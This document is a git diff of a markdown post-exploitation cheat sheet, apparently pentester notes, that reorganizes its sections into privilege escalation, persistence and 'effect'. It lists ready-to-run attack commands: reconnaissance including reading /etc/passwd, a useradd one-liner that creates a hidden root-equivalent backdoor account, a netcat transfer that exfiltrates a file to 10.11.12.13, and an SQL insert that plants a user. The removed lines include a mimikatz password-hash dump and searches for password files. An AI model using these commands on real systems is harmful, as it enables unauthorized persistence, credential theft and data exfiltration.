@@ -10,7 +10,8 @@
 * [Get Network Connections](#get-network-connections)
 * [Exfil via Netcat](#exfil-via-netcat)
 
-## Information to Gather for Privilege Escalation
+## Privilege Escalation
+### Information to Gather for Privilege Escalation
 | Information | Benefit to Privilege Escalation |
 | ----------- | ------------------------------- |
 | User Context |Establish who you are before working towards who you want to be. |
@@ -28,7 +29,7 @@
 | Device Drivers and Kernel Modules | Find matching exploits. |
 | AutoElevate Settings and Binaries | Find settings and/or files that run as the file owner when invoked. If AlwaysInstallElevated is enabled, exploit via a malicious .msi file. |
 
-## Gathering Information on a Windows System
+### Gathering Information on a Windows System
 ```bash
 whoami # print my current user context
 net user victor # print my group memberships, password policy, etc.   
@@ -37,53 +38,32 @@ hostname
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
 ```
 
-## Gathering Information on a Linux System
+### Gathering Information on a Linux System
 ```bash
 whoami # output shows your current user context
 id # print my current user context, uid, and gid
 cat /etc/passwd # print other accounts on this system
 hostname
+uname -a # print kernel version and system architecture
 cat /etc/issue # print OS version
 cat /etc/*-release # print OS version
-uname -a # print kernel version and system architecture
+netstat -pant 
 ```
 
-## One-liner: useradd and chpasswd
+## Persistence
+### Add a new user
 ```bash
 useradd -p $(openssl passwd -crypt password) -s /bin/bash -o -u 0 -g 0 -m victor
 ```
 
-## Dump Passwords
-```bash
-mimikatz.exe "lsadump::sam"
-```
-
-## Find Password Files
-```bash
-findstr /si password *.xml *.ini *.txt (Find passwords)
-```
-
-## Find Emailboxes
-```bash
-dir *.dbx /s 
-```
-
-## Get Network Connections
-```bash
-# all connections, no name resolution, and print owning PID 
-netstat -ano 
-
-# print filepath of each network-connected binary
-(Get-NetTcpConnection).OwningProcess | ForEach-Object { Get-Process -Id $_ | Select-Object -ExpandProperty Path } | Sort-Object | Get-Unique
-```
-
-## Exfil via Netcat
+## Effect
+### Exfil via Netcat
 ```bash
 nc -nvlp 5050 > stolen.exe
 nc.exe -w3 10.11.12.13 5050 < stealme.exe
 ```
 
-Add a new user to a SQL database
+### Add a new user to a SQL database
 ```sql
 INSERT INTO targetdb.usertbl(username, password) VALUES ('victor','please');
 ```
